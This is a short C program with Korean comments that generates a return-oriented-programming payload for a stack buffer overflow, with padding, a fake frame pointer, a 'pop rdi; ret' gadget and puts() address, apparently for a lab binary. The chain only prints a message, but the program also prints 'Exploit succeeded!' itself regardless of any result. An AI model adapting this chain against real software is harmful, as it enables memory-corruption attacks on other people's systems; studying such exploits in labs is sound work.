#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int main() {
    char payload[200];

    // 1. 문자열 주소 ("Exploit succeeded!\n" 가 위치한 주소)
    uintptr_t msg_addr = 0x404050;  // 바이너리에 삽입해둔 문자열 주소

    // 2. puts() 함수 주소
    uintptr_t puts_addr = 0x7ffff7e58f50;  // 실제 환경에 맞게 수정

    // 3. pop rdi; ret gadget 주소
    uintptr_t pop_rdi_ret = 0x40123b;  // 실제 바이너리에서 ROPgadget으로 확인

    // 4. 패딩 56바이트
    memset(payload, 'A', 56);

    // 5. fake rbp (optional)
    *(uintptr_t *)(payload + 56) = 0x4141414141414141;

    // 6. pop rdi; ret gadget
    *(uintptr_t *)(payload + 64) = pop_rdi_ret;

    // 7. rdi에 들어갈 문자열 주소
    *(uintptr_t *)(payload + 72) = msg_addr;

    // 8. puts() 함수 주소
    *(uintptr_t *)(payload + 80) = puts_addr;

    // 9. 페이로드 출력 (stdin 또는 파일에 리디렉션 가능)
    fwrite(payload, 1, 88, stdout);
    puts("Exploit succeeded!\n");

    return 0;
}
